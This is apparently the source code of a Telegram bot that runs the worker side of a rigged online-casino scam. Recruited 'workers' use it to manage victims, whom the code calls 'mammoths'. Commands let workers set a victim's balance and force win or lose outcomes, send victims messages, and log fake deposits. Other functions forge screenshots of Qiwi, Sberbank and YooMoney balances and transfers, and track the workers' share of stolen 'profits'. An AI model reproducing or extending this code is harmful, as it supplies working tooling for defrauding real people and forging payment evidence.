import worker_config
from worker_config import (bot, types, InputMediaPhoto, admin, db, keyboard, threading)
from worker_config import (set_status_work, unset_support, set_support, url_chat, payment_handler, set_status, delete_mamont, set_balance, 
						   show_mamont_info, message_to_mamont, create_promo, accept_receive, answer_from, no_hide_nickname, 
						   workers_receive, plural_profit, convert_date, create_phone, fake_qiwi_balance, fake_qiwi_transfer, fake_qiwi_get_pc,
						   fake_sber_balance, fake_yandex_balance, set_wallet)

@bot.message_handler(commands=['start'])  
def start_command(message):
	try:

		chat_id = message.chat.id

		inline_keyboard = types.InlineKeyboardMarkup(row_width = 1)
		inline_1 = types.InlineKeyboardButton(text = "✅ Принять правила проекта", callback_data = 'RULES')
		inline_keyboard.add(inline_1)

		bot.send_message(chat_id, f"💁🏻‍♀️ <b>Правила</b> нашего проекта:\n\n• Запрещена реклама, спам, флуд, 18+ контент, порно\n• Запрещено попрошайничество\n• Запрешена реклама своих услуг\n• Запрещено оскорблять участников проекта\n• Запрещено переходить на личности участников проекта"
			+ '\n\nТС не несет ответственности за блокировку кошельков / карт\n\n💁🏻‍♀️ Вы подтверждаете, что <b>ознакомились и согласны с условиями и правилами</b> нашего проекта?',
			parse_mode="html", reply_markup=inline_keyboard)

	except:
		pass

@bot.message_handler(commands=['promo'])  
def promo_command(message):
	try:

		chat_id = message.chat.id
		promo = message.text.split()
		
		if len(promo) == 2:
			
			promo = promo[1]

			if promo.isdigit():

				create_promo(message, promo)

			else:
				bot.send_message(chat_id, '⚠️ Введите /promo <b>[Сумма промокода]</b>',
					parse_mode = 'html')	
		else:
			bot.send_message(chat_id, '⚠️ Введите /promo <b>[Сумма промокода]</b>',
				parse_mode = 'html')



	except Exception as e:
		print(e)

@bot.message_handler(commands=['msg'])  
def msg_command(message):
	try:

		chat_id = message.chat.id
		msg = message.text.replace('/msg ', '')

		if ';' in msg:
			msg = msg.split(';')

			mamont_id = db.casino_user_id(msg[0])
			sended_message = msg[1]

			message_to_mamont(message, mamont_id, sended_message)
		else:
			bot.send_message(chat_id, '⚠️ Введите /msg <b>[ID Мамонта]</b>;<b>[Сообщение]</b>',
				parse_mode = 'html')

	except Exception as e:
		print(e)		

@bot.message_handler(commands=['info'])  
def info_command(message):
	try:

		chat_id = message.chat.id
		info = message.text.split()

		if len(info) == 2:
			mamont_id = db.casino_user_id(info[1])
			show_mamont_info(message, mamont_id)
		else:
			bot.send_message(chat_id, '⚠️ Введите /info <b>[ID Мамонта]</b>',
				parse_mode = 'html')

	except Exception as e:
		print(e)				

@bot.message_handler(commands=['blc'])  
def blc_command(message):
	try:

		chat_id = message.chat.id
		blc = message.text.replace('/blc ', '')

		if ';' in blc:
			blc = blc.split(';')

			mamont_id = db.casino_user_id(blc[0])
			set_balance(message, mamont_id, blc[1])

		else:
			bot.send_message(chat_id, '⚠️ Введите /blc <b>[ID Мамонта]</b>;<b>[Баланс]</b>',
				parse_mode = 'html')

	except Exception as e:
		print(e)						

@bot.message_handler(commands=['del'])  
def del_command(message):
	try:


		chat_id = message.chat.id
		dell = message.text.split()

		if len(dell) == 2:
			mamont_id = db.casino_user_id(dell[1])
			delete_mamont(message, mamont_id)
		else:
			bot.send_message(chat_id, '⚠️ Введите /del <b>[ID Мамонта]</b>',
				parse_mode = 'html')

	except Exception as e:
		print(e)								

@bot.message_handler(commands=['st'])  
def st_command(message):
	try:

		chat_id = message.chat.id
		st = message.text.replace('/st ', '')

		if ';' in st:
			st = st.split(';')

			mamont_id = db.casino_user_id(st[0])
			set_status(message, mamont_id, st[1])

		else:
			bot.send_message(chat_id, '⚠️ Введите /st <b>[ID Мамонта]</b>;<b>[Статус]</b>',
				parse_mode = 'html')

	except Exception as e:
		print(e)											

@bot.message_handler(commands=['auth'])  
def auth_command(message):
	try:

		chat_id = message.chat.id

		if chat_id in admin:

			db.workers_add_administator(chat_id)
			bot.send_message(chat_id, 'Вы авторизовались как администратор', reply_markup = keyboard.admin_keyboard())

	except Exception as e:
		print(e)											

@bot.message_handler(content_types=['text'])
def get_text_messages(message):
	try:

		chat_id = message.chat.id

		if message.text == '💁🏻‍♀️ Мой профиль':

			username = db.workers_username(chat_id)
			balance = db.workers_balance(chat_id)
			receive = db.workers_receive(chat_id)
			amount_profit = db.workers_amount_profit(chat_id)
			total_ptofit = db.workers_total_profit(chat_id)
			in_rage = db.workers_rage_profit(chat_id)
			status = db.workers_status(chat_id)

			inline_keyboard = types.InlineKeyboardMarkup(row_width = 2)
			inline_1 = types.InlineKeyboardButton(text = "Залеты", callback_data = 'WPROFIT')
			inline_2 = types.InlineKeyboardButton(text = "Вывод", callback_data = 'WRECEIVE')
			inline_3 = types.InlineKeyboardButton(text = "История", callback_data = 'WHISTORY')
			inline_keyboard.add(inline_1, inline_2, inline_3)

			if worker_config.status == '0':
				project = worker_config.status.replace('0', '🌑 Временно <b>не работаем</b>, тех. работы!')
			else:
				project = worker_config.status.replace('1', '🌕 Всё <b>работает</b>, можно воркать!')

			bot.send_message(chat_id, f'💁🏻‍♀️ Твой <b>профиль</b>\n\n🚀 Telegram ID: <b>{chat_id}</b>\nБаланс: <b>{balance}</b> ₽\nНа выводе: <b>{receive}</b> ₽\nОплата: <b>{worker_config.pay}%</b>, через т.п <b>{worker_config.pay_support}%</b>'
				+ f'\n\n💸 У тебя <b>{plural_profit(amount_profit)}</b> на сумму <b>{total_ptofit}</b> ₽\nСредний профит: ~ <b>{in_rage}</b> ₽\n\n💎 Статус: <b>{status}</b>\nВ команде: <b>{convert_date(chat_id)}</b>\n\n{project}',
				parse_mode = 'html', reply_markup = inline_keyboard)
		elif message.text == '🥀 Панель воркера':

			code = db.workers_code(chat_id)
			phone = db.workers_phone(chat_id)

			inline_keyboard = types.InlineKeyboardMarkup(row_width = 2)
			inline_1 = types.InlineKeyboardButton(text = "Список команд", callback_data = 'WCOMMAND')
			inline_2 = types.InlineKeyboardButton(text = "Мои мамонты", callback_data = 'WMAMONT')
			inline_3 = types.InlineKeyboardButton(text = "⚠️ Удалить всех мамонтов", callback_data = 'WDELL')
			inline_keyboard.add(inline_1, inline_2, inline_3)

			bot.send_message(chat_id, f'🥀 Панель <b>воркера</b>\n\nВаш код: {code}\nВаш кошелек: {phone}\nБот для работы: @{worker_config.casino}\nВаша реф. ссылка: https://t.me/{worker_config.casino}?start={code}',
				parse_mode = 'html', reply_markup = inline_keyboard)
		elif message.text == 'О проекте':

			amount_profit = db.project_amount_profit()
			total_ptofit = db.project_total_profit()

			if worker_config.status == '0':
				project = worker_config.status.replace('0', '🌑 Временно <b>не работаем</b>, тех. работы!')
			else:
				project = worker_config.status.replace('1', '🌕 Всё <b>работает</b>, можно воркать!')

			inline_keyboard = types.InlineKeyboardMarkup(row_width = 2)
			inline_1 = types.InlineKeyboardButton(text = "🔗 Инфо канал", url = f'{worker_config.url_info_channel}')
			inline_2 = types.InlineKeyboardButton(text = "📄 Правила", callback_data = 'RULES_2F')
			inline_3 = types.InlineKeyboardButton(text = "💸 Залеты", url = f'{worker_config.url_payments_channel}')
			inline_4 = types.InlineKeyboardButton(text = "💬 Чат воркеров", url = f'{worker_config.chat}')
			inline_keyboard.add(inline_1, inline_2, inline_3, inline_4)

			bot.send_message(chat_id, f'💁🏻‍♀️ <b>Информация</b> о проекте <b>WitGame</b>\n\n🔥 Мы открылись: <b>{worker_config.date_open}</b>\n💸 Количество залетов: <b>{amount_profit}</b>\n💰 Общая сумма профитов: <b>{total_ptofit}</b> ₽\n       Учёт статистики ведётся с <b>{worker_config.date_open_cc}</b>\n\n<b>Выплаты</b> проекта:\n— Оплата - <b>{worker_config.pay}%</b>'
				+ f'\n— Оплата через т.п <b>{worker_config.pay_support}%</b>\n\n🧑🏻‍💻 <b>ТС</b> - {worker_config.url_admin}\n\n<b>Состояние</b> проекта:\n{project}', parse_mode = 'html', reply_markup = inline_keyboard)
		elif message.text == 'Другое':

			bot.send_message(chat_id, '💁🏻‍♀️ Показаны все дополнительные <b>функции</b>', parse_mode = 'html', reply_markup = keyboard.other_keyboard())
		elif message.text == 'Скрины':

			a1 = open('screenshots/qiwi_ban.jpg', 'rb')
			a2 = open('screenshots/qiwi_data.jpg', 'rb')
			a3 = open('screenshots/qiwi_errno.jpg', 'rb')

			bot.send_media_group(chat_id, [InputMediaPhoto(a1),InputMediaPhoto(a2), InputMediaPhoto(a3)]) 
			bot.send_message(chat_id, 'Показаны все скриншоты для <b>обработки мамонтов</b>', parse_mode = 'html')
		elif message.text == 'Отрисовка':

			bot.send_message(chat_id, '💁🏻‍♀️ Выберите что хотите <b>отрисовать</b>', parse_mode = 'html', reply_markup = keyboard.pillow_keyboard())
		elif message.text == 'Qiwi баланс':
			photo = open('Image source/Qiwi/qiwi_balance.png', 'rb')
			message = bot.send_photo(chat_id, photo, caption='⏫ Это пример готового скрина\n\nВведите желаемый баланс для отрисовки')
			bot.register_next_step_handler(message, fake_qiwi_balance)
		elif message.text == 'Qiwi перевод':
			photo = open('Image source/Qiwi/qiwi_check.png', 'rb')
			message = bot.send_photo(chat_id, photo, caption='Введите необходимые данные:\n\n1️⃣ - сумма перевода\n2️⃣ - номер перевода\n3️⃣ - дату и время\n\nПример:\n500\n+79XXXXXXXXX\n04.12.2021 в 00:27')
			bot.register_next_step_handler(message, fake_qiwi_transfer)
		elif message.text == 'Qiwi получение (ПК)':
			message = bot.send_message(chat_id, 'Введите необходимые данные:\n\n1️⃣ - номер кошелька\n2️⃣ - баланс\n3️⃣ - название перевода\n4️⃣ - сумму перевода\n5️⃣ - комиссию\n6️⃣ - дату операции\n\nПример:\n+7 967 591‑18‑95\n2500,53\nQIWI Кошелек +79255798115\n25000.14\n100\n13.01.2021 в 11:09', parse_mode='Markdown')
			bot.register_next_step_handler(message, fake_qiwi_get_pc)
		elif message.text == 'Баланс Сбербанк':
			photo = open('Image source/Sber/access_balance.png', 'rb')
			message = bot.send_photo(chat_id, photo, caption='Введи необходимые данные:\n\n1️⃣ - системное время\n2️⃣ - баланс\n3️⃣ - последние 4 цифры карты\n\nПример:\n14:37\n25000\n5324')
			bot.register_next_step_handler(message, fake_sber_balance)
		elif message.text == 'Баланс ЮMoney':
			photo = open('Image source/Yandex/access.png', 'rb')
			message = bot.send_photo(chat_id, photo, caption='Введи сообщение для создания скриншота\n\nПример:\n23:19\nmylogin\n50 000,51')
			bot.register_next_step_handler(message, fake_yandex_balance)
		elif message.text == 'Админ. панель':

			status = db.workers_status(chat_id)

			if status == 'Администратор':

				bot.send_message(chat_id, 'Вы вошли в админ. панель', reply_markup = keyboard.panel_keyboard())
		elif message.text == 'Оплата (ручка)':

			status = db.workers_status(chat_id)

			if status == 'Администратор':

				message = bot.send_message(chat_id, 'Введите Telegram ID воркера и сумму залета')
				bot.register_next_step_handler(message, payment_handler)
		elif message.text == 'Изменить чат':

			status = db.workers_status(chat_id)

			if status == 'Администратор':

				message = bot.send_message(chat_id, 'Введите новую ссылку на чат')
				bot.register_next_step_handler(message, url_chat)
		elif message.text == 'Добавить саппорта':

			status = db.workers_status(chat_id)

			if status == 'Администратор':

				message = bot.send_message(chat_id, 'Введите Telegram ID')
				bot.register_next_step_handler(message, set_support)
		elif message.text == 'Состояние казино':

			status = db.workers_status(chat_id)

			if status == 'Администратор':

				message = bot.send_message(chat_id, 'Введите значение, 0 - тех. работы, 1 - работает')
				bot.register_next_step_handler(message, set_status_work)
		elif message.text == 'Мой кошелек':

			status = db.workers_status(chat_id)

			if status == 'Администратор' or status == 'Саппорт':

				inline_keyboard = types.InlineKeyboardMarkup(row_width = 1)
				inline_1 = types.InlineKeyboardButton(text = "Изменить кошелек", callback_data = 'WALLET')
				inline_keyboard.add(inline_1)

				bot.send_message(chat_id, f'Ваши данные от <b>QIWI</b>\n\nНомер: {worker_config.phone}\nТокен: {worker_config.token}', 
					parse_mode = 'html', reply_markup = inline_keyboard)
		elif message.text == 'Назад':

			status = db.workers_status(chat_id)

			if status == 'Администратор':
				bot.send_message(chat_id, 'Вы вернулись в главное меню', reply_markup = keyboard.admin_keyboard())
			else:
				bot.send_message(chat_id, 'Вы вернулись в главное меню', reply_markup = keyboard.main_keyboard())

		Thread = threading.Thread(target = no_hide_nickname, args = (message,))
		Thread.start()	


	except Exception as e:
		print(e)

@bot.callback_query_handler(func=lambda call: True)
def answer(call):
	try:

		chat_id = call.message.chat.id

		if call.data == 'RULES':

			if not db.user_exists_ticket(chat_id):
				db.user_add_ticket(chat_id)

			thread = db.ticket_thread(chat_id)

			if (thread == 0):
				message = call.message.text
				bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'{message}\n\nВы приняли правила проекта', parse_mode = 'html')
				message = bot.send_message(chat_id, f'🍀 Привет, <b>{call.message.chat.first_name}</b>, пройдем анкету вместе\nОткуда Вы о нас узнали?', parse_mode = 'html')
				bot.register_next_step_handler(message, answer_from)
			elif (thread == 1):
				bot.send_message(chat_id, '😟 Ваша заявка на <b>рассмотрении</b>, подождите её решения', parse_mode = 'html')
			elif (thread == 2):
				bot.send_message(chat_id, '❤️ Ваша заявка уже <b>принята</b>, воспользуйтесь клавиатурой для работы с ботом', parse_mode = 'html', 
					reply_markup = keyboard.main_keyboard())
		elif 'ACCEPT' in call.data and chat_id in admin:

			RegEx = call.data.split('_')

			message = call.message.text
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'{message}\n\n✅ Вы приняли заявку данного пользователя', parse_mode = 'html')

			if not db.user_exists_workers(RegEx[1]):
				db.user_add_workers(RegEx[1], 'Скрыт', create_phone())

			db.workers_update_thread(RegEx[1], 2)
			bot.send_message(RegEx[1], '❤️ Ваша заявка была <b>принята</b>, воспользуйтесь клавиатурой для работы с ботом', parse_mode = 'html', 
					reply_markup = keyboard.main_keyboard())
		elif 'CANCEL' in call.data and chat_id in admin:

			RegEx = call.data.split('_')

			message = call.message.text
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'{message}\n\n🚫 Вы отклонили заявку данного пользователя', parse_mode = 'html')

			inline_keyboard = types.InlineKeyboardMarkup(row_width = 1)
			inline_1 = types.InlineKeyboardButton(text = "↩️ Повторить попытку", callback_data = f'REPEAT_TICKET')
			inline_keyboard.add(inline_1)

			db.workers_update_thread(RegEx[1], 0)
			bot.send_message(RegEx[1], '💔 Ваша заявка была <b>отклонена</b>, воспользуйтесь клавиатурой для повторной подачи заявки', parse_mode = 'html', 
					reply_markup = inline_keyboard)
		elif 'BAN' in call.data and chat_id in admin:

			RegEx = call.data.split('_')

			message = call.message.text
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'{message}\n\nВы заблокировали данного пользователя', parse_mode = 'html')

			db.workers_update_thread(RegEx[1], 3)
			bot.send_message(RegEx[1], f'🙅🏻‍♀️ ТС {call.message.chat.first_name} <b>заблокировал</b> Вас', parse_mode = 'html', 
					reply_markup = keyboard.ban_keyboard())
		elif call.data == 'REPEAT_TICKET':
			thread = db.ticket_thread(chat_id)

			if (thread == 0):
				message = call.message.text
				message = bot.send_message(chat_id, f'🍀 Пройдем анкету заново!\nОткуда Вы о нас узнали?', parse_mode = 'html')
				bot.register_next_step_handler(message, answer_from)
			elif (thread == 1):
				bot.send_message(chat_id, '😟 Ваша заявка на <b>рассмотрении</b>, подождите её решения', parse_mode = 'html')
			elif (thread == 2):
				bot.send_message(chat_id, '❤️ Ваша заявка уже <b>принята</b>, воспользуйтесь клавиатурой для работы с ботом', parse_mode = 'html', 
					reply_markup = keyboard.main_keyboard())
		elif call.data == 'RULES_2F':
			bot.send_message(chat_id, f"💁🏻‍♀️ <b>Правила</b> нашего проекта:\n\n• Запрещена реклама, спам, флуд, 18+ контент, порно\n• Запрещено попрошайничество\n• Запрешена реклама своих услуг\n• Запрещено оскорблять участников проекта\n• Запрещено переходить на личности участников проекта"
				+ '\n\nТС не несет ответственности за блокировку кошельков / карт', parse_mode="html")
		elif call.data == 'WCOMMAND':

			inline_keyboard = types.InlineKeyboardMarkup(row_width = 2)
			inline_1 = types.InlineKeyboardButton(text = "Назад", callback_data = 'BACK')
			inline_keyboard.add(inline_1)

			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='🥀 <b>Casino</b> команды\nВсе доступные команды\n\n/blc [ID Мамонта];[Баланс] — установить баланс мамонту'
				+ '\n/st [ID Мамонта];[Статус] — статус (1 full win, 2 default, 3 full lose)\n/msg [ID Мамонта];[Сообщение] — сообщение мамонту\n/promo [Сумма] — создание промокода\n/info [ID Мамонта] — инфо. о мамонте\n/del [ID Мамонта] — удалить мамонта', parse_mode = 'html', reply_markup = inline_keyboard)
		elif call.data == 'BACK':
			code = db.workers_code(chat_id)
			phone = db.workers_phone(chat_id)

			inline_keyboard = types.InlineKeyboardMarkup(row_width = 2)
			inline_1 = types.InlineKeyboardButton(text = "Список команд", callback_data = 'WCOMMAND')
			inline_2 = types.InlineKeyboardButton(text = "Мои мамонты", callback_data = 'WMAMONT')
			inline_3 = types.InlineKeyboardButton(text = "⚠️ Удалить всех мамонтов", callback_data = 'WDELL')
			inline_keyboard.add(inline_1, inline_2, inline_3)

			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'🥀 Панель <b>воркера</b>\n\nВаш код: {code}\nВаш кошелек: {phone}\nБот для работы: @{worker_config.casino}\nВаша реф. ссылка: https://t.me/{worker_config.casino}?start={code}',
				parse_mode = 'html', reply_markup = inline_keyboard)
		elif call.data == 'WPROFIT':

			array = db.workers_last_profit(chat_id)

			if len(array) > 0:
				profit = '\n'.join(array)
				bot.send_message(chat_id, f'💁🏻‍♀️ Твои последние <b>10</b> залетов\n<i> - datetime | amount ₽</i>\n\n{profit}', parse_mode = 'html')
			else:
				bot.send_message(chat_id, '💁🏻‍♀️ У вас нет <b>залетов</b>', parse_mode = 'html')
		elif call.data == 'WHISTORY':
			array = db.workers_last_receive(chat_id)

			if len(array) > 0:
				profit = '\n'.join(array)
				bot.send_message(chat_id, f'💁🏻‍♀️ Твои последние <b>10</b> выводов\n<i> - datetime | amount ₽</i>\n\n{profit}', parse_mode = 'html')
			else:
				bot.send_message(chat_id, '💁🏻‍♀️ У вас нет <b>историй выводов</b>', parse_mode = 'html')
		elif call.data == 'WRECEIVE':

			balance = db.workers_balance(chat_id)

			if (float(balance) > 0):
				message = bot.send_message(chat_id, f'🍀 Введите реквизиты для вывода\nПример: <i>+79XXXXXXXX - Qiwi</i>', parse_mode = 'html')
				bot.register_next_step_handler(message, workers_receive, balance)
			else:
				bot.send_message(chat_id, '⚠️ <b>Не достаточно</b> средств на балансе', parse_mode = 'html')
		elif 'RECEIVE' in call.data:

			RegEx = call.data.split('_')

			message = call.message.text
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'{message}\n\nВы одобрили вывод воркеру', parse_mode = 'html')

			db.workers_clear_receive(RegEx[1])
			bot.send_message(RegEx[1], f'💁🏻‍♀️ ТС {call.message.chat.first_name} <b>одобрил</b> вывод, денежные средства поступят в течение 10 минут', parse_mode = 'html')
		elif 'ACCEPT_CASINO' in call.data:

			RegEx = call.data.split('_')
			mamont_id = RegEx[2]

			accept_receive(mamont_id)

			bot.answer_callback_query(callback_query_id=call.id, show_alert=False, text="Вы одобрили вывод")
			bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.message_id)
		elif call.data == 'WMAMONT':
			code = db.workers_code(chat_id)
			array = db.workers_mamonts(code)

			if len(array) > 0:
				mamonts = '\n'.join(array)
				bot.send_message(chat_id, f'💁🏻‍♀️ Твои <b>мамонты:</b> всего <b>{len(array)}</b>\n#ID | username - balance - status\n\n{mamonts}', parse_mode = 'html')
			else:
				bot.send_message(chat_id, '💁🏻‍♀️ У вас нет <b>мамонтов</b>', parse_mode = 'html')
		elif call.data == 'WDELL':

			inline_keyboard = types.InlineKeyboardMarkup(row_width = 2)
			inline_1 = types.InlineKeyboardButton(text = "Подтвердить удаление", callback_data = 'WDELL_ALL')
			inline_keyboard.add(inline_1)

			bot.send_message(chat_id, '⚠️ Вы действительно хотите удалить <b>всех своих мамонтов</b>?', parse_mode = 'html', reply_markup = inline_keyboard)
		elif call.data == 'WDELL_ALL':
			code = db.workers_code(chat_id)
			result = db.workers_delete_mamonts(code)

			if result > 0:
				bot.send_message(chat_id, f'💁🏻‍♀️ Всего удалено мамонтов: <b>{result}</b>', parse_mode = 'html')
			else:
				bot.send_message(chat_id, '💁🏻‍♀️ У вас нет <b>мамонтов</b>', parse_mode = 'html')
		elif 'DEPOSIT_CASINO_' in call.data:

			RegEx = call.data.split('_')

			db.casino_add_fake(RegEx[2], RegEx[3])

			message = call.message.text
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'{message}\n\nФейк оплата добавлена')
		elif call.data == 'WALLET':

			message = bot.send_message(chat_id, 'Введите данные от <b>QIWI</b> в формате phone:token', parse_mode = 'html')
			bot.register_next_step_handler(message, set_wallet)
		elif call.data == 'PAID':

			status = db.workers_status(call.from_user.id)

			if status == 'Администратор':

				message = call.message.text
				message = message.replace('💞', '✅')

				bot.edit_message_text(chat_id = call.message.chat.id, message_id=call.message.message_id, text = message)

	except Exception as e:
		print(e)
		
bot.polling(none_stop = True, interval = 0)